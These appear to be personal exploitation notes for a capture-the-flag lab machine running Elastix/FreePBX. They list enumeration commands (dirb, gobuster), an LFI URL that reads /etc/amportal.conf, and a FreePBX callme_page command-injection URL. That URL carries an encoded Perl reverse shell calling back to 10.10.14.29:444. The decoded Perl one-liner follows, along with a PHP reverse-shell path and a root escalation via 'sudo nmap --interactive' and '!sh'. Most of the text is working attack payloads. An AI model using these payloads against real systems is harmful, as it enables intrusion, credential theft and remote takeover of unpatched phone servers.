elastics

input_user
input_pass

apache 2.2.3 Struts
openssh 4.3 dos attack
esmtp postfix 5.5.2
asterisk 1.8.7
freepbx 2.5

elastixSession=799um53ehhi9c077ralc1s5fn7
testing=1

https://www.securityfocus.com/archive/1/533728

dirb http://10.10.10.7/ -f  /usr/share/wordlists/dirb/common.txt

gobuster dir -k -u https://10.10.10.7/ -w /usr/share/wordlists/dirb/big.txt

freepbx 2.8.1.4
elastix ?

Exploit:

LFI vuln:
https://www.exploit-db.com/exploits/37637

https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

jEhdIekWmdjE

/usr/share/webshells/php/php-reverse-shell.php

from freepbx.py use this to call extension 233 

description:

https://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/

https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.29%3a444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.29:444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;

then check `sudo -l` to see that nmap is allowed.

so:

`sudo nmap --interactive` then `!sh` to become root
